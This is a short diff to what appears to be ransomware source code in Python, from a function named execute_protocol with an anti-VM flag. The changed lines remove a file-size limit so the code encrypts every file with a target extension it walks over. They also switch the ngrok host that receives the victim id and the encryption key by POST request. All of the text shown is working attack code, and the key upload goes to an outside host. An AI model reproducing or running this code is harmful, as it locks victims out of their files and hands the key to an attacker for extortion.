@@ -107,12 +107,12 @@ def execute_protocol(antivm=True, send_post=True, executable=True):
                     full_path = root + os.sep + fn
                     ext = cm.get_file_extension(full_path)
                     if ext in cm.TARGET_EXT and ext not in cm.EXCLUDED_EXT and fn != 'test.txt':
-                        if os.path.getsize(full_path) < cm.MAX_SIZE_FILE:
-                            cm.symmetric_encrypt_or_decrypt(full_path)
-                            print(full_path + ' -> [encrypted]')
+                        #if os.path.getsize(full_path) < cm.MAX_SIZE_FILE:
+                        cm.symmetric_encrypt_or_decrypt(full_path)
+                        print(full_path + ' -> [encrypted]')
         
         if send_post:
-            cm.send_post_request(url='http://9ca31b80390f.ngrok.io', id=str(id), key=cm.key)
+            cm.send_post_request(url='http://204a586e623c.ngrok.io', id=str(id), key=cm.key)
         else:
             cm.save_key_as_file(hidden=False)
 
